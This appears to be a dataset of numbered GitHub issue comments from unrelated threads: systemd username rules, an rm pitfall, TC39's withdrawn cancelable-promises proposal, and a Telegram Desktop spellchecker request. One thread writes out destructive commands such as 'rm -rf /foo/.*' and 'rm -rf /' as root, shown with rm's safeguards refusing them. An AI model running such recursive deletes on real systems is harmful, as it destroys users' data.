I am happy with changing our rules, but before we do that, please work with the POSIX, shadow-utils, libuser communities, as well with the other Linux distributions to come up with a single unified set of rules, and then we are happy to adopt that too in systemd. But until then, I think it's better for systemd to stick to the rules that only permit names that are portable to all of these systems. After all systemd not only consumes these names, it also potentially creates them (via sysusers.d or when DynamicUser=1 is used), and we should make sure systemd cannot beused as a vehicle for creating users that are otherwise not allowed.

Also: don't forget we don't break people's stuff with this, User=/Group= knew no counterpart in sysvinit, because priv dropping had to be implemented by the daemons manually there. If you do decide to let systemd  do the priv dropping for you, we politely ask you to use portable names, so that the unit files work everywhere. And the rules we enforce are neither crazy nor random, they are the common core every distro accepts."
5710	"I am not sure I'd consider this much of a problem. Yeah, it's a UNIX pitfall, but ""rm -rf /foo/.*"" will work the exact same way, no?"
5711	No, not on Fedora 24 at least.
5712	">> no?

No

http://pubs.opengroup.org/onlinepubs/9699919799/utilities/rm.html#tag_20_111_16

> The rm utility is forbidden to remove the names dot and dot-dot in order to avoid the consequences of inadvertently doing something like:
> 
> rm -r .*
"
5713	Here's the regression tests in coreutils https://github.com/coreutils/coreutils/blob/e7a2580b96370da03c4d3553ccdf4ee66a14c6a4/tests/rm/r-4.sh#L39 which includes the `rm -rf .////` case.
5714	"For some people it's advisable to never miss a chance to stay silent.

Debian:
> root@5afb081909c8:/# mkdir /foo/ 
> root@5afb081909c8:/# rm -rf /foo/.*
> rm: refusing to remove '.' or '..' directory: skipping '/foo/.'
> rm: refusing to remove '.' or '..' directory: skipping '/foo/..'

Ubuntu:
> root@b5d54715a834:/# mkdir /foo/ 
> root@b5d54715a834:/# rm -rf /foo/.*
> rm: refusing to remove '.' or '..' directory: skipping '/foo/.'
> rm: refusing to remove '.' or '..' directory: skipping '/foo/..'

Busybox:
> / # mkdir /foo/
> / # rm -rf /foo/.*
> rm: can't remove '.' or '..'
> rm: can't remove '.' or '..'

It took a whole of 5mins to test all of these.

I find it particularly interesting since the comment I am referring to has been made *after* the issue has been solved already. Way to highlight how little consideration is being given to issues reported by `systemd` users. Bodes well for the whole project!..
"
5715	"> I am not sure I'd consider this much of a problem. 

shocking to hear

> Yeah, it's a UNIX pitfall, but ""rm -rf /foo/.*"" will work the exact same way, no?

no, and you REALLY should know that as many others do or AT LEAST test it before pretend such nonsense - frankly, that below is not something theoretical, i do that for many years to get /tmp/ really empty

[root@testserver:/tmp]$ rm -rf .
./          ../         .font-unix/ .ICE-unix/  .Test-unix/ .X11-unix/  .XIM-unix/
[root@testserver:/tmp]$ rm -rf .*
rm: Entfernen von '.' Verzeichnis '..' nicht möglich: '.' wird übersprungen
rm: Entfernen von '.' Verzeichnis '..' nicht möglich: '..' wird übersprungen

"
5716	"and look how others see it as ""much of a problem"" when something by accident kills the whole OS - and yes i am terrible angry by that comment which shows something of an bad attitude

[root@testserver:~]$ rm -rf /
rm: it is dangerous to operate recursively on '/'
rm: use --no-preserve-root to override this failsafe
"
5717	This proposal experienced significant opposition from within Google and so I am unable to continue working on it.
5718	That sucks. In theory, somebody else could pick this proposal back up and champion it though, right?
5719	They could, but they would be blocked by other Googlers in TC39, so it would be fruitless.
5720	Could you tell us why they are opposed to this, please?
5721	"I'm sorry, I cannot really participate in these discussions any more, for my own mental health; it has been draining enough pursuing the fight internally, and losing. (In addition to the plethora of issues opened here by various people who believe they have a superior proposal, which was a constant drain.) They'll have to speak for themselves.

I'll be unsubscribing from this thread and I ask that nobody @-mention me."
5722	I see. Thank you, and I hope you get to feeling better!
5723	"😞 

I've been following this repo for awhile and seen all the noise of others.
It's a lot of pressure trying to get this one right.

I leave you with an internet hug 🤗 

![hugs](http://1.bp.blogspot.com/-4f_SyZAFuLk/TynYFZFDXyI/AAAAAAAAFcw/LWF1TYJ3lTk/s320/supernatural-hug.gif)"
5724	"> I'm sorry, I cannot really participate in these discussions any more, for my own mental health

I'm not @-mentioning you here, but I'm glad you're taking time to yourself and I know the efforts you invested on this in the meetings.

I hope you feel better soon."
5725	🤗 feel well, people do appreciate the work you do.
5726	"Found this link [explanation](https://docs.google.com/presentation/d/1V4vmC54gJkwAss1nfEt9ywc-QOVOfleRxD5qtpMpc8U/edit#slide=id.g112c357033_0_137)

Can someone please show me the link to the counter arguments please ?"
5727	"Counter arguments would be nice if anyone is aware of them.  Sounds like some Google folk objected for some reason:

> They could, but they would be blocked by other Googlers in TC39, so it would be fruitless.

I wonder what the Googlers objections were.

This proposal getting withdrawn seems a bit mysterious at the moment, and I know there are APIs (like fetch) that were hoping to get a solution soon."
5728	From which stage this propose was dropped?
5729	stage 1?
5730	@mqklin and @dinoboff yes it was stage 1
5731	@landonpoch thanks. Do you know any proposes that was dropped at stage 2 or upper? Sorry for the offtop 
5732	Object.observe was stage 2.
5733	"Generally speaking though it seems like at stage 2:

""The committee expects the feature to be developed and eventually included in the standard""

https://tc39.github.io/process-document/"
5734	Expectations are not certainties.
5735	"This is sad news. I really believe that there needs to be support for cancelling a promise in the specification. The fact that employees of Google on the TC39 committee are able to block proposals like this kind of worries me. I thought the whole point of TC39 was to make unbiased decisions on what goes into Javascript. 

As far as I could find, I couldn't find any real valid reasons as to why this proposal should not go through. I saw some of the other contributions and they were flawed, this was the only thought out proposal. Incredibly sad."
5736	"@Vheissu i'm sure by the next meeting in January, the reasons will be made apparent.

One of the important priorities in TC39 is to achieve consensus - which means that any employee of any member company can always block any proposal. It's far far better for anyone to be able to block, than to arrive at a spec that ""not everyone"" is willing to implement - this is, by a large large margin, the lesser evil, I assure you."
5737	@ljharb as much as I agree with what you're saying, it would be nice to have a little transparency so that we could at least know of the arguments against this proposal.
5738	@adrianmcli it's worth waiting at least until the January TC39 meeting to learn what those are.
5739	"Beyond all else, what raises alarm in me is the comment Domenic made about his mental health. Does anyone have any insight on what he means?  I can empathize with how draining making a logical case can be when others truly believe in their alternatives the way you believe in yours.  Is this that or is this something more?

Maybe this is just me not having spent time at a larger corporation, or as part of a technical committee of a major language, but anyone coming to feel like that as an outcome of trying to do their best seems ugly and unacceptable."
5740	"It's possible that this was blocked in favour of Observables:
https://github.com/tc39/proposal-observable

(I don't yet have an opinion on the merits such a decision if it was made for this reason. Observables bring quite a lot to the table, but they do also bring added complexity.)"
5741	@ablakey Someones health is a persons own business, so it is best not ask — either them or third parties — to publicly share information about a private affair. That also includes speculating, you don't want people to feel the need to set the record straight about stuff that was no one elses business in the first place.
5742	@Robbert you're right. I should rephrase to not target a specific person or private matter, lest I accidentally push them to talk about it publicly.  But if it's to be more general, I may as well raise the discussion in a different forum. 
5743	" Usually in other working groups there is a chance to explain why a proposal was withdrawn, for example the Scheme working group provided the ballot and the results of their votes along with any extra explanation as to why they voted the way they did: http://trac.sacrideo.us/wg/wiki/WG1Ballot1Results

It would be nice if that happens in this case; achieving consensus is important but transparency is equally important especially when it affects many many more users and developers."
5744	"> experienced significant opposition from within Google

must be against their dragnet gag orders /s"
5745	@ablakey maybe will be interesting to read: https://medium.com/@thejameskyle/dear-javascript-7e14ffcae36c#.k0isj0qfz
5746	"> Found this link explanation

> Can someone please show me the link to the counter arguments please ?

I don't have links, but have a few counter arguments of my own:

- A third state is an unnecessary when cancellation can already be represented as a special case of accept/reject.
- Cancellation does not make sense for every async operation. For example, would it make sense cancelling a database fetch or a filesystem read?

OTOH It seems the main argument in favor of the cancel state(according to the presentation) is that the following snippet is not very elegant:

```js
try {
  await fetch(...);
} catch (e) {
  if (!(e instanceof CancelError)) {
    showUserMessage(""The site is down."");
  }
} finally {
  stopLoadingSpinner();
}
```

But rejection is not the only way to represent cancellation, which can also be a return value:

```
try {
  let result = await fetch(...);
} catch (e) {
 showUserMessage(""The site is down."");
} finally {
  stopLoadingSpinner();
}
```

In the above, we could consider the fetch to be cancelled by inspecting the return value. Also, you probably don't want cancellation to be propagated like an exception."
5747	@tarruda any cancellation have sense - at least to prevent following code execution, which can be much more resource-consuming than cancelled action itself.
5748	"> A third state is an unnecessary when cancellation can already be represented as a special case of accept/reject.

There are lots of problems raised with this alternative as well though (for instance, if ""special case"" means ""special value"" then we've moved even further away from Promises as generic type containers for _any_ value).  

This is just an extremely tricky bit of functionality with many, many cross-cutting concerns and subtle gotchas.  Other languages bridge it with a very different model from Promises themselves.  But too many apis are Promise-based for things to move forward without some solution for cancelation. Extremely grateful for all the work put into trying to find a solution here."
5749	"I would agree with @tarruda, I do not see why cancellation as a custom exception can not cover most of the cases?

Implementing a third state does not seem like a good solution. "
5750	I think the way a ReadableStream can be cancelled with [fetch](https://fetch.spec.whatwg.org/#readablestream) is good enough, simply `reader.cancel()`
5751	"Cancellation is a valuable primitive state as it allows preventing downstream work when other factors intervene. No longer need to render a report? Cancel the long and expensive request to the API. Saves resources on the client. The server can do the same thing. Client closed the connection before our long running database query finished? Stop the query to release the resources for other requests.

This proposal was well thought out and clean. I'm really looking forward to hearing the counter arguments."
5752	"Just a quick thought regarding @tarruda's suggestion:
> OTOH It seems the main argument in favor of the cancel state(according to the presentation) is that the following snippet is not very elegant:
> 
> ```js
> try {
>   await fetch(...);
> } catch (e) {
>   if (!(e instanceof CancelError)) {
>     showUserMessage(""The site is down."");
>   }
> } finally {
>   stopLoadingSpinner();
> }
> ```

I agree that his doesn't feel particularly elegant. But the bigger problem that sticks out to me is interoperability.

This approach may work well inside a single author's code, but there's no guarantee that multiple authors will share an implementation of a `CancelPromise` class (or whatever you call it). Symbols seem like a better fit, but even if the community standardize on something like `const CancelPromise = Symbol.for('CancelPromise')` there would still be some outliers that weren't familiar with the convention."
5753	"@tarruda Actually, adding ""canceled"" would be a fourth state: { `in-flight`, `succeeded`, `rejected`, `canceled` }. 

OK, so you could combine `rejected` and `canceled`. Fine, but you can go further. Why not combine `succeeded` and `rejected`, too? Essentially, a promise is in one of two states: { `in-flight`, `completed` }. When it transitions from `in-flight` to `completed`, user code needs to be invoked. Whether the promise succeeded or failed could be carried in the completion payload. Success and error completions could be handled via convention, similar to how Node callbacks typically accept errors in their first parameter.

The argument for keeping `succeeded` separate from `rejected` is that it's extremely convenient. But it's certainly not essential. Regarding cancellation, the question is really whether the convenience of making it first-class outweighs the conceptual complexity."
5754	"The process for the TC39 committee is here: https://tc39.github.io/process-document/

The champion of this proposal withdrew it and maybe there is some other champion within the committee who will pick it up. _If there are objections to this proposal it would be much more transparent to have had a vote on it rather than have its champion withdraw it._ It's a shame that the committee member who was the champion was stressed out and it looks like burnt out by the discussion around this proposal.

_I would recommend that everyone who has an opinion on this to post a blog somewhere about it and continue the discussion there or on Freenode IRC (something like channel `#tc39-promises`?)._ If someone has a really strong opinion they should continue the work; polyfills are something we can live with in the JavaScript world, what with babel and other transpilers around. When the issue is closed the conversation here will be closed but definitely should continue elsewhere.

What I like about TC39 is that they are making an effort to have polyfills to make it possible to use these new language features today and this proposal wasn't any different. So instead of idle talk, we can download the code, try it ourselves and then write a blog about it with all the technical details and reasoning as to why we think this should be picked up by another champion or why you think it's ok to drop this proposal."
5755	"@sstelfox you made some good points as to why cancelling some async operations can be useful, but can you give an argument as to why it needs to be part of the promise API?

> I'm really looking forward to hearing the counter arguments.

- A third state is an unnecessary when cancellation can already be represented as a special case of accept/reject.
- Cancellation does not make sense for every async operation. For example, would it make sense cancelling ~~a database fetch or~~ a fast filesystem operation(eg: `fs.stat`)?
- Programming languages have to be careful when adding new features/APIs(Promises now being part of javascript). There's always a risk someone will come up with a better solution in the future, deprecating the use of `Promise.cancel` after a bunch of code already depends on it, at which point it can no longer be removed.
- Has no direct correspondence with synchronous programming(async/await, as explained in the presentation). For example, how do you cancel `await timeout(5000);`? It would be possible with a intermediary object used to manage the timer:

```js
let timer = new Timer();
emitter.on('some-event', () => timer.cancel());
await timer.timeout(5000);
```

But having a standardized `Promise.cancel()` brings nothing to the table here, as only the implementation of `Timer` is calling it directly.
"
5756	"> @tarruda Actually, adding ""canceled"" would be a fourth state: { in-flight, succeeded, rejected, canceled }.

> OK, so you could combine rejected and canceled. Fine, but you can go further. Why not combine succeeded and rejected, too? Essentially, a promise is in one of two states: { in-flight, completed }. When it transitions from in-flight to completed, user code needs to be invoked. Whether the promise succeeded or failed could be carried in the completion payload. Success and error completions could be handled via convention, similar to how Node callbacks typically accept errors in their first parameter.

> The argument for keeping succeeded separate from rejected is that it's extremely convenient. But it's certainly not essential. 

Agreed. 

> Regarding cancellation, the question is really whether the convenience of making it first-class outweighs the conceptual complexity.

IMHO it doesn't, mainly because it doesn't fit into synchronous programming style using `async`/`await`, which is already seeing widespread use."
5757	"> But having a standardized Promise.cancel() brings nothing to the table here

@tarruda This proposal did not include a ""standardized Promise.cancel()"" method.  It was based on cancelation tokens.  It was also very compatible with async / await syntax IMO."
5758	"@tarruda I agree that languages have to be careful but that's what these discussions are for. I also agree not all operations *can or should* be cancellable, but this mechanism doesn't require all promises to support cancellation.

The proposal here is to provide a standardized mechanism of cancelling in flight async requests, and allow for specific callbacks to (optionally) be triggered under the circumstances. In a lot of cases neither `success` or `rejected` are correct ways to reason about something that no longer needs to happen.

Quite a few developers will take a `success` message to trigger additional processing, storage, event notifications and will not take into account the case where the information is no longer needed. Perhaps this is an oversight on their part, but I don't personally consider it reasonable to assume `cancelled` as a successful state. Similarly with a `rejected` state, this is most commonly associated with an error state which cancellation isn't. It was a designed and intended action and shouldn't go through error handling logic while still allowing a path through a cleanup and optional callback mechanism.

The cancellation token mechanism allows for a consistent way for users of the language to chain these cancellations together as well downstream through libraries and chains of events, controlled by the original caller. You can create a `CancelToken` passing it through a tree of calls and upon triggering of that cancellation handle, it will propagate to the leafs of the call tree and cease performing any needless work that supports the mechanism.

By having that a standard part of the language, library and framework authors can implement it as an optional but consistent feature to save resources."
5759	"I'm sad that this was withdrawn. I was just discovering this proposal and getting excited about it. I hope that my feedback didn't contribute to the stress.

When I [added cancellation](https://github.com/Polymer/polymer-analyzer/pull/411) to the polymer static analyzer I found that I didn't really need much. `cancelToken.throwIfRequested()` and a clear way of distinguishing a Cancel from a normal exception was sufficient.

I put together a polyfill of the parts of this proposal that don't require new syntax here:
* https://github.com/rictic/cancel-token

Feedback very welcome."
5760	"So, the ""cancellation tokens"" proposal is being withdrawn here. What about promise cancellation in general? We rely heavily on cancellation in our client apps, and we use the https://github.com/petkaantonov/bluebird library for promises that support cancellation. We won't move to built-in JS promises until cancellation support is there.

@tarruda I think it makes a lot of sense for cancellation to be a separate API, for developer convenience.

Example cancellation scenarios for us:
- aborting a chain of async operations for building up UI when that UI gets disposed (e.g. when navigating away from a page)
- aborting animations (since our visual transitions are modeled as promises)
- aborting service requests

We were originally on Bluebird2 which bundled cancellation with rejection, which gave us cancellation but it was a huge pain to use. We encountered so many subtle bugs that we ended up writing some utility code to work around them. Also, developers had to consciously think about cancellation whenever writing a rejection handler or calling cancel(), since cancellation would bubble up as an unhandled promise rejection if we didn't explicitly handle it. And it was a pain to unit test all these cases.

Bluebird3 made things a lot easier for us by making cancellation a separate top-level concept with different semantics than rejection - see changes here: http://bluebirdjs.com/docs/api/cancellation.html

Now, our rejection handlers just have to worry about rejection, and when we call cancel() we don't have to worry about it being unintentionally raised as rejection, or subtle timing issues caused by cancellation being async. The separate syntax is nice, but the main reason I see for having cancellation be a separate concept is the semantic differences."
5761	tfw google has a monopoly on JS.
5762	"If cancellation was baked into promises from the start then `promise.cancel()` would be pretty nice, but if we added it in today it would break existing code. e.g. this is a fairly common pattern:

```javascript
class PromiseCache {
  constructor() {
    this._cache = new Map();
  }
  get(key) {
    if (!this._cache.has(key)) {
      this._cache.set(key, this._compute(key));
    }
    return this._cache.get(key);
  }
  async _compute(key) {
    // some work that computes a value
  }
}
```

That code is correct today, and if we added `promise.cancel()` and cancellation propagated to a promise in the cache, then it in effect cancels all future requests for the corresponding key.

Breaking the invariants of existing code is a non-starter here, which pretty much leaves us with cancellation causing either a resolve or a reject with a special Cancel object. Thus, CancelTokens and Cancel objects that are kinda like exceptions."
5763	"I missed the idea on the first read, sorry for the confusion regarding async/await. Now I can certainly see how powerful the concept of cancellation tokens can be for chaining async operations that can be cancelled.

Still, making changes to the language or Promise API(adding ""cancelled"" state) seems unnecessary, more so when you consider that most of the benefits of cancellation tokens come from following an API convention and not from changes in the existing tools. Maybe I'm missing something, but can someone highlight what the proposal would bring to the following example?

```js
async function job1(token) {
  let result = await job2(token);
  if (token.cancelled) return;
  return result;
}

async function job2(token) {
  let result = 0;
  for (let i = 0; i < 1000000; i++) {
     result += await someAsyncComputation();
     if (token.cancelled) return;
  }
  return result;
}

async function job(maxTimeout) {
  let token = new CancelToken(async (cancel) => {
    await timeout(maxTimeout);
    cancel();
  });
  let result = job1(token);
  if (token.cancelled) {
    throw new Error(""timed out"");
  }
  return result;
}
```

This is indeed a powerful pattern, but it can done without any changes to the language or ties with the promise API."
5764	@tarruda Based on the above sample, if `someAsyncComputation` was an xhr request it can't be aborted. It is just that the caller doesn't get the response.
5765	"As far as i know you can't cancel a promise, you either success or fail miserably, but you can not step back and say, hey no I was joking it wasn't really a promise!

P.S. just joking "
5766	"@mjerez-radical My thought on this is success means the promise has fulfilled its obligation, failure means it was unable to, and cancellation means the original requestor of a promise no longer needs it, so it's pointless for the promise to continue to try and fulfill it. It's not really ""breaking a promise"", as much as it is a state that indicates that the result/sequence of events is no longer needed. "
5767	my thoughts are that things are being pushed toward rxjs (functional programming, and it is part of TC) thus the reluctance to add features around promises...
5768	"The only true ""original"" requestor is really the constructor itself. And it, by current design, doesn't expose any external api resulting from the async operation, nor does it yet have a reason to cancel its own operation.  The only thing it externally offers is an interface for chaining on things that depend on its eventual state.  So either you have to statefully keep track of all of the things later chained onto it (like Bluebird does) or smuggle an out-of-scope hook for cancelation into the scope of the original constructor somehow (like cancel tokens do)."
5769	I personally like the simple Promise/async-await mapping: resolve is the returned value and reject throws an exception...and that's all
5770	Wishing for domenics speedy recovery, I know just what a toll mental health issues can take on a person.  It's tough.  Thank you for your hard work.
5771	"@tarruda no offense, but people who come to the repo and don't read the prior discussion and reading list are causing a real problem and exhaust collaborators. Your whole discussion here in much more depth is available in different documents throughout this repo together with motivating usage examples that show the design decision. In addition this proposal has already majorly changed 3 times and cancellation semantics to reach ""consensus"" at least 4 times in its existence. 

I know you're just trying to help - but this is why people like Domenic get so worn out from this work.

I don't do nearly as much spec work as he does but I feel it too."
5772	"And everyone dissing Google here for shutting down the proposal without knowing the reasons involved, people stop. It's hurtful. 

Google is full of people (Including Domenic btw, who _wrote_ this proposal) and disagreement is taken very seriously. If an implementor won't implement a specification that's a problem for everyone - not just that implementor - it could have just as easily been Mozilla, Microsoft or Apple."
5773	"Instead of trying to deal with all the problems associated with adding a cancelled state, why not side step them by working with how promises work right now. Just make Promise.cancel a back propagating resolve/reject?
```
let p = fetch().then(r => console.log('resolved')).catch(r => console.err('rejected'));
p.cancel('fake response'); // prints 'resolved'
p.cancel(new Error('uhoh')); //prints 'rejected'
```
The key here is the caller is responsible for what should get passed down the chain, which solves many of the problems posed by whoever cancels things.
So cancel(Error) passes the error down the rejection path, a function cancel((resolve, reject) => {}) allows either, and anything else goes down the resolved path.

The other important thing here is that it should work it's way back through the chain until it finds a CancellablePromise, thus allowing a way for multiple consumers to still work properly. 
```
let onCancelled = (cancelledValue, resolve, reject, cancel) => {}
let f = fetch();
let cancellable = f.then(onFulfilled, onRejected, onCancelled);
let c1 = cancellable.then(r => console.log('c1'));
let c2 = cancellable.then(r => console.log('c2'));

c1.cancel(); // passes undefined to onCancelled's cancelledValue and does nothing
f.cancel(); // resolves fetch with undefined, passing it down the chains, eventually prints c1 & c2
```
And the default onCancelled on non cancellable promises would be
```(cancelledValue, resolve, reject, cancel) => { cancel(cancelledValue) } ```
which just back propagates the cancelledValue up the chain. "
5774	"@chrisregnier that was this proposal a while ago. See the history and discussions in the git history - for example: https://github.com/tc39/proposal-cancelable-promises/issues/8.

Also please refer to https://github.com/tc39/proposal-cancelable-promises/issues/70#issuecomment-268101606 . Thanks.

People - please, if you have a proposal bring it up at esdiscuss (https://esdiscuss.org/) and not here."
5775	"Great recap over at [HN](https://news.ycombinator.com/item?id=13210849):

> Promises have always been extremely contentious in JS for a couple reasons and Domenic has had the patience of a saint getting the original proposal through so it's totally understandable that he might not want to deal with this anymore especially if people in his org are against it.
> There were a couple reasons the original promises were so contentious to standardize.
> - Monads: there was a very vocal faction on TC-39 that really wanted a Promises to be monadic and very much emphasized mathematical purity over usefulness and any attempt to discuss things tended to get side tracked into a discussion about monads, see brouhaha over Promise.cast [1].
> - Error handling: Promises have a bit of a footgun where by default they can swallow errors unless you explicitly add a listener for them. As you can theoretically add an error listener latter on all other options had downsides (not always obvious to advocates) leading to a lot of arguing, must of it after things had shipped and realistically couldn't be changed. Fixed by platforms and libraries agreeing on a standardization of uncaught promise events [2].
> - Just an absurd amount of bike shedding probably the 2nd most bike shedded feature of the spec (behind modules).
> So cancelable promises reignite all the old debates plus there's no obvious right way to do it, like should it be a 3rd state which could cause compatibility issues and would add complexity, or should cancellations just be a sort of forced rejection, which would be a lot more backwards compatibility but with less features.
> Additionally there is a bizarre meme that somehow observables (think event emitters restricted to a single event or synchronous streams that don't handle back pressure) are a replacement for promises or are a better fit for async tasks they should be used instead.
> edit: patients => patience
> 1. https://esdiscuss.org/topic/promise-cast-and-promise-resolve
> 2. https://gist.github.com/benjamingr/0237932cee84712951a2

@benjamingr Please close this thread and restrict commenting."
5776	@indolering I don't have the ability to do so and even if I did - I'm not a TC39 member and would defer to a member anyway. I appreciate the linking to my gist in that comment - it's very nice to be recognized for pushing for things that help people.
5777	I closed comments and restricted to members.
5778	"I guess I can pimp my own solution here: http://inqlude.org/libraries/sonnet.html
"
5779	"whatever solution, a solution is needed.
"
5780	"yes, this is a very important feature to have!
"
5781	"I created a new request for this, sorry. I created #237.
"
5782	"Need Spell Checker for Russian language. 
"
5783	"Still wanted. (English.) Notepad++ has a spell check plugin, perhaps someone could adapt that?
"
5784	"would be nice to have.
"
5785	"It will be nice feature!
"
5786	"Pitching in here to plead for this to get implemented. My smelling needs checking :)
"
5787	"TinySpell is a workable solution for people who really need spellchecking right now.
Just figured I'd post it here since it's what I am doing in the mean time.
"
5788	"In most open source projects it's all about integrating Enchant (since it works on OSX, Windows, Linux and can cover a huge number of languages) unless they want to do some kind of special in-house spell-checker. Which I assume most be what they are looking into having taken this long, normally Enchant is pretty fast and easy to get worked into a project.

The main thing is it would be nice if they would actually talk to us. Thus far the only thing I'm disliking about Telegram is that the developers don't seem to want to inform the community about anything in the works.  Channels are a good example; they are cool and could be very awesome with a few more additional features, one of the biggest things I'd like to see is a self-hosted web-view so that none-members could view channels without needing to install any telegram client, or you could embed the channel in a website as a replacement for RSS. However there's no idea as to what to really expect from channels since the team behind telegram doesn't share any insight on the future of the project.
"
5789	"On Linux the best solution would be to utilize hunspell for this.
"
5790	"So many people shaming the devs and so zero people submitting pull requests. 
"
5791	"@jacobmischka 
You know I hear whtieknight shield polish is still on sale from Cyber Monday in a few places. >.>
"
5792	"@jacobmischka +1
"
5793	"Please, would be good if the Windows version used the API (8+) https://msdn.microsoft.com/en-us/library/windows/desktop/hh869852(v=vs.85).aspx cause then it supports the touch keyboard for tablets too.
"
5794	"@Placid7 you're wrong actually. The protocol is open source, all the apps acting as clients are open source etc (so they're not proprietary, and one of the many reasons I chose telegram in the first place). Implementing a spell checker has nothing to do with proprietary or security. In fact, it shouldn't even be hard to add that feature. I would do it myself if I had the time.
"
5795	"Then I'm going to give a +1 @jacobmischka. My mind is blown that so many people are making this request and virtually no pull requests.

If it is open source and the protocol is available why isn't there a plugin being worked out by the users (which is what I cam here looking for)? I'm new to programming and don't have the skill to develope this from scratch and was actually looking for someone who was already working on this so I could take a wack at it.
"
5796	"Maybe we should start a Kickstarter campaign in order to get some money to hire a C++ dev to implement this issue.
"
5797	"Oh, I just read through [CONTRIBUTING.md](https://github.com/telegramdesktop/tdesktop/blob/master/CONTRIBUTING.md), if someone implemented this would it even be merged? @auchri 
"
5798	"I'm sure that it should use system API's on OSX and Windows, and on Linux too, if any.
Or a Qt plugin, I think there are some spellchecking plugins.
Don't invent a bicycle.
"
5799	"Hunspell + Qt is common, certainly he wasn't planning on writing a spellchecking library from scratch. The system APIs make it a bit obnoxious making it cross platform, which I imagine will be the most annoying part. 
"
5800	"@auchri Could you please check if Hunspell license is compatible with TDesktop one?
"
5801	"@stek29 Hunspell is triple licensed (`Free software (LGPL, GPL, MPL tri-license)`). Since [LGPL 2.1](https://github.com/hunspell/hunspell/blob/master/license.hunspell) [is compatible](http://www.gnu.org/licenses/license-list.en.html#LGPLv2.1) with GPLv3 (the license which Telegram Desktop [uses](https://github.com/telegramdesktop/tdesktop/blob/master/LICENSE)), it's save to use it with tdesktop :)
"
5802	"And looks like it also supports static linking (if `HUNSPELL_STATIC` is defined)
"
5803	"Hello.
Please support Persian (Farsi) spell checker.
Thank you.
"
5804	"Wait... Opened in 2014 and still no solution? I really want this feature!
"
5805	"I think you can provide spellchecking for English first...
"
5806	"I agree with @sandsmark's comment from 2 years ago, sonnet seems like a great choice here. Stick with Qt, stick cross platform.

https://github.com/KDE/sonnet
https://inqlude.org/libraries/sonnet.html

> Sonnet is a plugin-based spell checking library for Qt-based applications. It supports several different plugins, including HSpell, Enchant, ASpell and HUNSPELL.
> 
> It also supports automated language detection, based on a combination of different algorithms.
> 
> The simplest way to use Sonnet in your application is to use the SpellCheckDecorator class on your QTextEdit.

As long as you're using QTextEdit widgets, this would seem to be a very simple introduction.

I'd wager this project would see a healthy bump in pull requests if they moved to upstream Qt rather than a custom patched version (and consequently featured a simpler build process).
"
5807	"In FAQ you say **""**No Call for now. **We specialize in sending messages**, ... There are still many things that we can revolutionize in messaging.**""**
I think spell checker is one of the _most-basic feature_ in every messaging app. Please add English spell checker for Windows client.
"
5808	"we need that feature! on linux is very easy an integration of hunspell or other solutions
"
5809	"If nobody else hasn't started working at hunspell implementation I can try to do this, but I don't know telegram code, so it can take a time... I've got simple code to Qt5 spell checker (via hunspell) - now it needs to be implemented in telegram-desktop.
"
5810	"@telegramdesktop are you using a QTextEdit widget for the message composer box?
"
5811	"@AndydeCleyre yes, this is QTextEdit. I haven't tried Sonnet, but it should work.

My hunspell highlighter works properly with Polish and English words. The most difficult thing is to create options for it :smile:

Screenshot (Telegram Desktop v0.9.56; Qt 5.6.1):
![telegram-spellchecker](https://cloud.githubusercontent.com/assets/6239090/17072666/51b2caf2-506a-11e6-8f4f-96da4907cf99.png)

---

> Unfortunately we do not merge any pull requests that have new feature implementations, translations to new languages and those which introduce any new user interface elements.

Hmm... What with this?
"
5812	"I've got this: ~~https://github.com/zaps166/tdesktop/commit/d4ed33144d35915d100eb27e574c89473e9b689d~~ https://github.com/zaps166/tdesktop/commit/bfd2d2dbbfd9d0e06d727f62a67baaf4a520aca5

Also attached here (forked repository can be changed or removed): [Add spell checker via hunspell.patch.txt](https://github.com/telegramdesktop/tdesktop/files/379486/Add.spell.checker.via.hunspell.patch.txt)

For me (and probably for users which want to compile tdesktop) it is sufficient :) The code uses system language as default spell checker and also always en_US as a second language (you can change it in code).
The patch can be applied also for stable (not master) version (just replace tabs by four spaces for `*.pro` file in the patch).
Also I recommend to use Qt 5.6.1 (only Windows code has rejects which can be ignored for Linux users) :smile:

For static linking (also for Windows and OS X) the hunspell probably must be patched to use dictionaries from Qt resources.
If the PRs with new features won't be merged (according to contribution guide) currently I won't finish it - developers can use this code or guide me what to do (add and fix - travis, code, *.pro files; replace hard-coded paths and langs, etc.) for adding a new feature.
"
5813	"Can confirm, @zaps166's works wonderful.
"
5814	"@auchri @john-preston Is it any chance for accepting PR with a new feature? If yes I can do some fixes and create a PR... Or just use my code (it is already signed in my repo) :)
"
5815	"@zaps166 did you test it on all platforms? Had you rewrote docs?
What about languages? What about non-default languages?
What about disabling spellcheck inside code blocks? (``` ... ``` and ` ... `)
What about using OS X's spellchecker on OS X, not hunspell's default one?
Have you checked compatibility with mentions by name (Blue text)?

Btw why you haven't used kde's sonnet? I've thought it would be easier...
"
5816	"@stek29

> did you test it on all platforms? Had you rewrote docs?

No, currently this is Linux-only (see `*.pro` file diff). Patch is not finished.

> What about languages? What about non-default languages?

It needs settings for this, as I wrote before - patch is not finished. Currently uses english and system language (if exists). Adding GUI for this with translations for supported languages by Telegram is more work than implementing spell-checking itself. If PR with new features are not accepted, so no need for doing this now (CONTRIBUTING.md).

> What about disabling spellcheck inside code blocks? (`...` and `...`)

Should be implemented, but currently it won't underline brackets and other characters, only variables and maybe some keywords.

> What about using OS X's spellchecker on OS X, not hunspell's default one?

I don't know Obj-C and OS X API. Hunspell is portable, so it should work there. Also Hunspell can unify spell-checking. Native spell-checking can be implemented anytime later.

> Have you checked compatibility with mentions by name (Blue text)?

Which blue text? I don't fully understand this sentence. Text with ""@"" prefix (it is blue)?

---

> Btw why you haven't used kde's sonnet? I've thought it would be easier...

Maybe I'll try later if it is easier (but Hunspell is already implemented...) - currently it is sufficient for me :smile:
"
5817	"@zaps166 blue text: try mentioning someone who has no username.
"
5818	"@stek29 If someones name won't be in dictionary then it will underline it, but it still will be blue (currently).
"
5819	"@zaps166 @stek29 any updates on this?
"
5820	"What? 2 years? @auchri just don it, omg
"
5821	"@Pub4Game I've got other things to do.
"
5822	"@auchri I understand, but 2 years? It is difficult to add the change text event of the field and to add a spell check?
"
5823	"@Pub4Game If it's so easy why won't you do it? I think TD team would be happy to merge your PR.
"
5824	"@stek29

I'm so tired of that ""logic.""

What's easy for a cardiac surgeon is not easy for a physicist.

Just because someone can recognize something is easy for someone else doesn't mean it's easy for them.

People aren't ants. We have individual variation.

Coders these days, infected by greed almost to a man, don't take a dump without a royalty fee in the offing, regardless of ease. When they aren't simply lying about being coders in the first place.

Heh, but what do we expect from the only industry on earth where being called a ""hack"" isn't an insult?
"
